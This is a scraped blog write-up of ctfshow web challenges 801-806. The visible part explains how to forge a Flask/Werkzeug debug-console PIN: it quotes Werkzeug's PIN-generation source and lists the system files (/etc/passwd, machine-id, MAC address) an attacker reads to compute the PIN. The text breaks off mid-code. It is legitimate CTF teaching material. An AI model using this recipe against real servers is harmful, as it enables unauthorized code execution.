{"blogid": "124099832", "writerAge": "码龄3年", "writerBlogNum": "55", "writerCollect": "13", "writerComment": "22", "writerFan": "19", "writerGrade": "3级", "writerIntegral": "600", "writerName": "k_du1t", "writerProfileAdress": "writer_image\\profile_124099832.jpg", "writerRankTotal": "37849", "writerRankWeekly": "98032", "writerThumb": "30", "writerVisitNum": "59754", "blog_read_count": "3050", "blog_time": "已于 2022-04-20 12:00:28 修改", "blog_title": "[ctfshow web入门]常用姿势801-806", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-light\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>1NDEX</h3>\n<ul><li><a href=\"#0x00__1\">0x00 前言</a></li><li><a href=\"#801_flask_pin_4\">801 flask pin码计算</a></li><li><ul><li><ul><li><ul><li><a href=\"#python_3836_pin_5\">谨记！！python 3.8和3.6 pin码生成方式不同</a></li><li><a href=\"#werkzeugmachineid_6\">werkzeug版本不同machine-id获取不同</a></li></ul>\n</li><li><a href=\"#python38_pin_12\">python3.8 pin码生成</a></li><li><a href=\"#_202\">要素</a></li><li><ul><li><a href=\"#0161get_machineid_215\">过一下前一个版本（0.16.1）get machine-id部分源码</a></li><li><a href=\"#werkzeug_100rc1_254\">werkzeug 1.0.0rc1及以后</a></li></ul>\n</li><li><a href=\"#36_MD5_290\">3.6 MD5</a></li><li><a href=\"#38_sha1_337\">3.8 sha1</a></li><li><a href=\"#web801_386\">实操一下web801</a></li></ul>\n</li></ul>\n</li><li><a href=\"#802__401\">802 无字母数字命令执行</a></li><li><ul><li><ul><li><a href=\"#_402\">异或法</a></li></ul>\n</li></ul>\n</li><li><a href=\"#803_phar_444\">803 phar文件包含</a></li><li><a href=\"#804_phar_501\">804 phar反序列化</a></li><li><a href=\"#805_open_basedir_534\">805 open_basedir绕过</a></li><li><ul><li><ul><li><a href=\"#1p_549\">1.拿p神的脚本镇一下</a></li><li><a href=\"#2_chdir_664\">2. chdir过</a></li></ul>\n</li></ul>\n</li><li><a href=\"#806_rce_678\">806 无参数rce</a></li><li><ul><li><ul><li><a href=\"#1_session_id_683\">1. session_id执行</a></li><li><a href=\"#2getallheaders_696\">2.getallheaders()</a></li><li><ul><li><ul><li><a href=\"#getallheaders_698\">getallheaders</a></li><li><a href=\"#end_706\">end</a></li><li><a href=\"#array_reverse_715\">array_reverse</a></li></ul>\n</li></ul>\n</li><li><a href=\"#3_get_defined_vars_729\">3. get_defined_vars()</a></li><li><ul><li><ul><li><a href=\"#get_defined_vars_730\">get_defined_vars</a></li></ul>\n</li></ul>\n</li><li><a href=\"#4scandircurrentlocaleconv_748\">4.scandir(current(localeconv()))</a></li><li><a href=\"#5_dirname_753\">5. dirname</a></li><li><ul><li><ul><li><a href=\"#dirname_755\">dirname</a></li><li><a href=\"#array_flip_773\">array_flip</a></li><li><a href=\"#array_rand_782\">array_rand</a></li><li><a href=\"#str_split_801\">str_split</a></li><li><a href=\"#set_include_path_817\">set_include_path</a></li></ul>\n</li></ul>\n</li></ul>\n</li></ul>\n</li><li><a href=\"#0x02_rethink_849\">0x02 rethink</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"0x00__1\"></a>0x00 前言</h1>\n<p>小记一手ctfshow web入门常用姿势</p>\n<h1><a id=\"801_flask_pin_4\"></a>801 flask pin码计算</h1>\n<h4><a id=\"python_3836_pin_5\"></a>谨记！！python 3.8和3.6 pin码生成方式不同</h4>\n<h4><a id=\"werkzeugmachineid_6\"></a>werkzeug版本不同machine-id获取不同</h4>\n<p>参考</p>\n<blockquote>\n<p>https://blog.csdn.net/weixin_54648419/article/details/123632203</p>\n</blockquote>\n<p>条件: flask debug模式开启 存在任意文件读取</p>\n<h3><a id=\"python38_pin_12\"></a>python3.8 pin码生成</h3>\n<pre><code class=\"prism language-python\"><span class=\"token comment\">#生效时间为一周</span>\nPIN_TIME <span class=\"token operator\">=</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">7</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">hash_pin</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span>pin<span class=\"token punctuation\">}</span></span><span class=\"token string\"> added salt\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"replace\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span>\n\n\n_machine_id<span class=\"token punctuation\">:</span> t<span class=\"token punctuation\">.</span>Optional<span class=\"token punctuation\">[</span>t<span class=\"token punctuation\">.</span>Union<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n\n<span class=\"token comment\">#获取机器号</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_machine_id</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> t<span class=\"token punctuation\">.</span>Optional<span class=\"token punctuation\">[</span>t<span class=\"token punctuation\">.</span>Union<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> _machine_id\n\n    <span class=\"token keyword\">if</span> _machine_id <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> _machine_id\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">_generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> t<span class=\"token punctuation\">.</span>Optional<span class=\"token punctuation\">[</span>t<span class=\"token punctuation\">.</span>Union<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n        linux <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span>\n\n        <span class=\"token comment\"># machine-id is stable across boots, boot_id is not.</span>\n        <span class=\"token keyword\">for</span> filename <span class=\"token keyword\">in</span> <span class=\"token string\">\"/etc/machine-id\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/proc/sys/kernel/random/boot_id\"</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n                    value <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span> OSError<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">continue</span>\n\n            <span class=\"token keyword\">if</span> value<span class=\"token punctuation\">:</span>\n            <span class=\"token comment\">#读取文件进行拼接</span>\n                linux <span class=\"token operator\">+=</span> value\n                <span class=\"token keyword\">break</span>\n\n        <span class=\"token comment\"># Containers share the same machine id, add some cgroup</span>\n        <span class=\"token comment\"># information. This is used outside containers too but should be</span>\n        <span class=\"token comment\"># relatively stable across boots.</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/self/cgroup\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n            <span class=\"token comment\">#继续进行拼接，这里处理一下只要/docker后的东西</span>\n                linux <span class=\"token operator\">+=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rpartition<span class=\"token punctuation\">(</span><span class=\"token string\">b\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">except</span> OSError<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">pass</span>\n\n        <span class=\"token keyword\">if</span> linux<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> linux\n\n        <span class=\"token comment\"># On OS X, use ioreg to get the computer's serial number.</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            <span class=\"token comment\"># subprocess may not be available, e.g. Google App Engine</span>\n            <span class=\"token comment\"># https://github.com/pallets/werkzeug/issues/925</span>\n            <span class=\"token keyword\">from</span> subprocess <span class=\"token keyword\">import</span> Popen<span class=\"token punctuation\">,</span> PIPE\n\n            dump <span class=\"token operator\">=</span> Popen<span class=\"token punctuation\">(</span>\n                <span class=\"token punctuation\">[</span><span class=\"token string\">\"ioreg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"IOPlatformExpertDevice\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-d\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> stdout<span class=\"token operator\">=</span>PIPE\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>communicate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">match</span> <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'\"serial-number\" = &lt;([^&gt;]+)'</span><span class=\"token punctuation\">,</span> dump<span class=\"token punctuation\">)</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">match</span> <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token keyword\">match</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span> <span class=\"token punctuation\">(</span>OSError<span class=\"token punctuation\">,</span> ImportError<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">pass</span>\n\n        <span class=\"token comment\"># On Windows, use winreg to get the machine guid.</span>\n        <span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>platform <span class=\"token operator\">==</span> <span class=\"token string\">\"win32\"</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">import</span> winreg\n\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">with</span> winreg<span class=\"token punctuation\">.</span>OpenKey<span class=\"token punctuation\">(</span>\n                    winreg<span class=\"token punctuation\">.</span>HKEY_LOCAL_MACHINE<span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SOFTWARE\\\\Microsoft\\\\Cryptography\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                    winreg<span class=\"token punctuation\">.</span>KEY_READ <span class=\"token operator\">|</span> winreg<span class=\"token punctuation\">.</span>KEY_WOW64_64KEY<span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> rk<span class=\"token punctuation\">:</span>\n                    guid<span class=\"token punctuation\">:</span> t<span class=\"token punctuation\">.</span>Union<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">]</span>\n                    guid_type<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span>\n                    guid<span class=\"token punctuation\">,</span> guid_type <span class=\"token operator\">=</span> winreg<span class=\"token punctuation\">.</span>QueryValueEx<span class=\"token punctuation\">(</span>rk<span class=\"token punctuation\">,</span> <span class=\"token string\">\"MachineGuid\"</span><span class=\"token punctuation\">)</span>\n\n                    <span class=\"token keyword\">if</span> guid_type <span class=\"token operator\">==</span> winreg<span class=\"token punctuation\">.</span>REG_SZ<span class=\"token punctuation\">:</span>\n                        <span class=\"token keyword\">return</span> guid<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span>\n\n                    <span class=\"token keyword\">return</span> guid\n            <span class=\"token keyword\">except</span> OSError<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">pass</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span>\n\n    _machine_id <span class=\"token operator\">=</span> _generate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> _machine_id\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">_ConsoleFrame</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"Helper class so that we can reuse the frame console code for the\n    standalone console.\n    \"\"\"</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> namespace<span class=\"token punctuation\">:</span> t<span class=\"token punctuation\">.</span>Dict<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">.</span>Any<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>console <span class=\"token operator\">=</span> Console<span class=\"token punctuation\">(</span>namespace<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_pin_and_cookie_name</span><span class=\"token punctuation\">(</span>\n    app<span class=\"token punctuation\">:</span> <span class=\"token string\">\"WSGIApplication\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> t<span class=\"token punctuation\">.</span>Union<span class=\"token punctuation\">[</span>t<span class=\"token punctuation\">.</span>Tuple<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">.</span>Tuple<span class=\"token punctuation\">[</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"Given an application object this returns a semi-stable 9 digit pin\n    code and a random key.  The hope is that this is stable between\n    restarts to not make debugging particularly frustrating.  If the pin\n    was forcefully disabled this returns `None`.\n\n    Second item in the resulting tuple is the cookie name for remembering.\n    \"\"\"</span>\n    pin <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"WERKZEUG_DEBUG_PIN\"</span><span class=\"token punctuation\">)</span>\n    rv <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n    num <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n\n    <span class=\"token comment\"># Pin was explicitly disabled</span>\n    <span class=\"token keyword\">if</span> pin <span class=\"token operator\">==</span> <span class=\"token string\">\"off\"</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span>\n\n    <span class=\"token comment\"># Pin was provided explicitly</span>\n    <span class=\"token keyword\">if</span> pin <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">and</span> pin<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>isdigit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># If there are separators in the pin, return it directly</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"-\"</span> <span class=\"token keyword\">in</span> pin<span class=\"token punctuation\">:</span>\n            rv <span class=\"token operator\">=</span> pin\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            num <span class=\"token operator\">=</span> pin\n\n    modname <span class=\"token operator\">=</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">,</span> <span class=\"token string\">\"__module__\"</span><span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">.</span>cast<span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">,</span> app<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__module__<span class=\"token punctuation\">)</span>\n    username<span class=\"token punctuation\">:</span> t<span class=\"token punctuation\">.</span>Optional<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">]</span>\n\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># getuser imports the pwd module, which does not exist in Google</span>\n        <span class=\"token comment\"># App Engine. It may also raise a KeyError if the UID does not</span>\n        <span class=\"token comment\"># have a username, such as in Docker.</span>\n        username <span class=\"token operator\">=</span> getpass<span class=\"token punctuation\">.</span>getuser<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> <span class=\"token punctuation\">(</span>ImportError<span class=\"token punctuation\">,</span> KeyError<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        username <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n\n    mod <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>modname<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># This information only exists to make the cookie unique on the</span>\n    <span class=\"token comment\"># computer, not as a security feature.</span>\n    probably_public_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n        username<span class=\"token punctuation\">,</span>\n        modname<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">,</span> <span class=\"token string\">\"__name__\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__name__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>mod<span class=\"token punctuation\">,</span> <span class=\"token string\">\"__file__\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">]</span>\n\n    <span class=\"token comment\"># This information is here to make it harder for an attacker to</span>\n    <span class=\"token comment\"># guess the cookie name.  They are unlikely to be contained anywhere</span>\n    <span class=\"token comment\"># within the unauthenticated debug page.</span>\n    private_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>uuid<span class=\"token punctuation\">.</span>getnode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> get_machine_id<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\n    h <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> bit <span class=\"token keyword\">in</span> chain<span class=\"token punctuation\">(</span>probably_public_bits<span class=\"token punctuation\">,</span> private_bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> bit<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">continue</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            bit <span class=\"token operator\">=</span> bit<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span>\n        h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">)</span>\n    h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b\"cookiesalt\"</span><span class=\"token punctuation\">)</span>\n\n    cookie_name <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"__wzd</span><span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span>h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">20]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span>\n\n    <span class=\"token comment\"># If we need to generate a pin we salt it a bit more so that we don't</span>\n    <span class=\"token comment\"># end up with the same value and generate out 9 digits</span>\n    <span class=\"token keyword\">if</span> num <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b\"pinsalt\"</span><span class=\"token punctuation\">)</span>\n        num <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">09d</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>\n\n    <span class=\"token comment\"># Format the pincode in groups of digits for easier remembering if</span>\n    <span class=\"token comment\"># we don't have a result yet.</span>\n    <span class=\"token keyword\">if</span> rv <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> group_size <span class=\"token keyword\">in</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> group_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n                rv <span class=\"token operator\">=</span> <span class=\"token string\">\"-\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>\n                    num<span class=\"token punctuation\">[</span>x <span class=\"token punctuation\">:</span> x <span class=\"token operator\">+</span> group_size<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span>group_size<span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> group_size<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            rv <span class=\"token operator\">=</span> num\n\n    <span class=\"token keyword\">return</span> rv<span class=\"token punctuation\">,</span> cookie_name\n\n</code></pre>\n<h3><a id=\"_202\"></a>要素</h3>\n<ol><li>username 启动flask的用户名 (/etc/passwd 读取</li><li>modname 默认值flask.app</li><li>appname 默认flask</li><li>moddir 可通过报错信息得到 flask库下app.py的绝对路径</li><li>uuidnode 读取/sys/class/net/ens33/address MAC地址十六进制转化为十进制 根据网卡名称自行更改</li><li>machine-id（更正）</li></ol>\n<p>回看commit返现问题</p>\n<blockquote>\n<p>https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f</p>\n</blockquote>\n<p><strong>werkzeug 1.0.0rc1 release中做了变动</strong></p>\n<h4><a id=\"0161get_machineid_215\"></a>过一下前一个版本（0.16.1）get machine-id部分源码</h4>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">get_machine_id</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> _machine_id\n    rv <span class=\"token operator\">=</span> _machine_id\n    <span class=\"token keyword\">if</span> rv <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> rv\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">_generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># docker containers share the same machine id, get the</span>\n        <span class=\"token comment\"># container id instead</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/self/cgroup\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n                value <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span> IOError<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">pass</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            value <span class=\"token operator\">=</span> value<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>partition<span class=\"token punctuation\">(</span><span class=\"token string\">\"/docker/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n\n            <span class=\"token keyword\">if</span> value<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> value\n\n        <span class=\"token comment\"># Potential sources of secret information on linux.  The machine-id</span>\n        <span class=\"token comment\"># is stable across boots, the boot id is not</span>\n        <span class=\"token keyword\">for</span> filename <span class=\"token keyword\">in</span> <span class=\"token string\">\"/etc/machine-id\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/proc/sys/kernel/random/boot_id\"</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token 